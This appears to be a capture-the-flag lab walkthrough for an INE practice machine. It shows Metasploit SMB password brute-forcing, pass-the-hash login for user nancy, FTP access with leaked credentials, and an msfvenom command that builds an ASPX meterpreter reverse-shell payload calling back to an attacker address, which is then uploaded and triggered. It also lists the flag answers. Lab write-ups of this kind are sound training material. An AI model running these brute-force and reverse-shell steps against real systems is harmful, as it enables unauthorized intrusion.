
---

# Lab Environment

A target machine is accessible at **target.ine.local**. Identify the services and capure the flags.

- **Flag 1:** Looks like smb user **tom** has not changed his password from a very long time.
- **Flag 2:** Using the NTLM hash list discovered in the previous challenge, can you compromise the smb user **nancy**?
- **Flag 3:** I wonder what the hint found in the previous challenge be useful for!
- **Flag 4:** Can you compromise the target machine and retrieve the **C://flag4.txt** file?

The following wordlist will be useful:

- /usr/share/wordlists/metasploit/unix_passwords.txt

# Tools

- Metasploit
- Nmap
- smbmap
- Firefox

---
We will start with our Nmap scan and import the scan results to MSF: `nmap -Pn -A -v target.ine.local -oX nmap`

We find multiple open ports but the one that we are more insteresetd in are: FTP/21, HTTP/80, and SMB/445

Since the first flag telling us the username and the service, we will use MSF module: "smb_login" to brute-force the user tom.

We get the password:"felipe"

Now, we set the smb_pass option to '' and we set the smbpass to felipe. To get an smb session, we set the option CreateSession to true.

After we get a session, we can list the shares by: `shares` and to interact with shares: `shares -i (Share ID)`

The first flag is going to be in:"HRDocuments"

Also, we will find a list of NTLM hashes in that share, we download both files by using command download.



**First flag:** 0edeb7b848224ccb9e03f6118f2c9fdc

---
To get the second flag, we will use the same MSF module we used before but this time we will set the username to nancy and the pass_file to the NTLM hashes file we got earlier.

We get this hash that would authenticate with nancy username: "aad3b435b51404eeaad3b435b51404ee:b3ddea4b4b957f3e037af75cfe5"

Again, we will create a SMB session. 

Second flag is going to be in: "ITResources" share with a hint for the third flag.

We download both files.

**Second flag:** 2d3236107fb44b6cba8583fcfd8ab5ae

---

The hint.txt content reveals the credentials for "david" user with password: "omnitrix_9901"

We will try to login to smb service using these credentials, but we can't.

We will try to login using FTP: `ftp david@`10.0.24.189

We get the third flag.

**Third flag:** d34b5f6f99e742a7b671d55db82049b0

---

Since we have access to where the files of the website running on the target machine is stored, we will create a reverse shell payload using MSFVenom.

Since we know the target machine is Windows: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.43.10 LPORT=1234 -f aspx> payload.aspx`

We will upload the payload file that we created to FTP using "put command"

Now, we will use "multi/handler" MSF module and set the payload to the same payload we used with MSFVenom with the same LPORT and LHOST options.

We will go to the target URL and put next to it:"/payload.aspx"

This will activate our payload and we will get a meterpreter session on the target host.

Forth flag can found in: "C:\flag4.txt"

**Forth flag:** 82dbe39e495243c2887577d66c0b9fcc





